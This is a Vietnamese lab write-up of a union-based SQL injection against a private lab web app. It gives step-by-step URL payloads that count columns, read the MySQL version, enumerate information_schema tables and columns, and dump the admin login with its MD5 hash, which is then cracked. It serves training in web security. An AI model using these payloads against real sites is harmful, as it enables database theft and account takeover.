	#LAB

-Ta có đoạn url: http://192.168.215.133/cat.php?id=1

**B1**:Thử thêm vào `'` hay `''` và load thì thấy xuất hiện đoạn link lạ:
```sh
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' at line 1 
```
-Chứng tỏ web này đã mắc lỗi SQL injection

**B2**:Sử dụng Order by để Xác định số cột trong bảng hiện tại. 
-Thử với order by 4:
`http://192.168.215.133/cat.php?id=1 order by 4`
-->Trang web vẫn load bình thường

-Thử với order by 5:
`http://192.168.215.133/cat.php?id=1 order by 5`
-->Trang web Trắng bóc không hiển thì gì cả

-Chứng tỏ chỉ có 4 cột trong bảng hiện tại

**B3**:Xác định hệ quản trị CSDL.Với mỗi hệ khác nhau thì sẽ có cách tấn công khác nhau.
-Bằng cách xem source hoặc qua đoạn lỗi phía trên:
```sh
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' at line 1 
```
Ta xác định được nó hệ quản trị CSDL của nó là MySQL

-Tiếp tục xác định cột chứa các dữ liệu cần tìm bằng Union Select:
```sh
http://192.168.215.133/cat.php?id=1 Union Select 1,2,3,4--
```
Ở cuối trang hiện ra cột mình cần tìm là 2.

**B4**:Xác định version hiện tại của nó hiện tại. Vì với phiên bản khác nhau thì phải thực hiện bằng các cách khác nhau để tìm ra thông tin admin.
```sh
http://192.168.215.133/cat.php?id=1 Union Select 1,version(),3,4--
```
Xuất hiện phiên bản của nó là 5.1.63

**B5**:Ta tiếp tục truy vấn và tìm ra tất cả các table_name trong Cột đó. Ta sẽ sử dụng database Information_schema.
```sh
http://192.168.215.133/cat.php?id=1 Union Select 1,table_name,3,4 From Information_schema.tables--
```

Ta thấy sẽ xuất hiện ra một dãy các table trong cột đó. Và thông tin về quyền truy cập admin ta cần tìm nằm ở một trong những table đó

**B6**:Thường khi lập trình viên viết web sẽ có thói quen sử dụng các tên quen thuộc như admin,users,... để đặt cho các table đó. Kết hợp với việc loại bỏ các table hệ thống không cần thiết. Trường hợp này thì đoán ra đưọc là table mình cần tìm là users
-Với table users ta sẽ thực hiện truy vấn và xác định tên của các cột chứa thông tin mình cần tìm:
```sh
http://192.168.215.133/cat.php?id=1 Union Select 1,column_name,3,4 From Information_schema.columns Where table_name=(0x7573657273)--
```
-`0x7573657273` chính là table users sau khi được mã hóa ra mã hex

-Ta sẽ thu được 3 cột là id,login, password

**B7**:Biết được 3 cột cần tìm ta tiếp tục truy vấn và lấy ra thông tin cần tìm:
```sh
http://192.168.215.133/cat.php?id=1 Union Select 1,concat(id,login,password),3,4 From users--
```
-Kết quả thu đưọc
```sh
1admin8efe310f9ab3efeae8d410a8e0166eb2
```
-Trong đó id=1 , login=admin ,password=8efe310f9ab3efeae8d410a8e0166eb2

-password được mã hóa theo chuẩn md5. Sau khi Decrypt nó ra ta thu đưọc `P4ssw0rd` là kết quả cần tìm

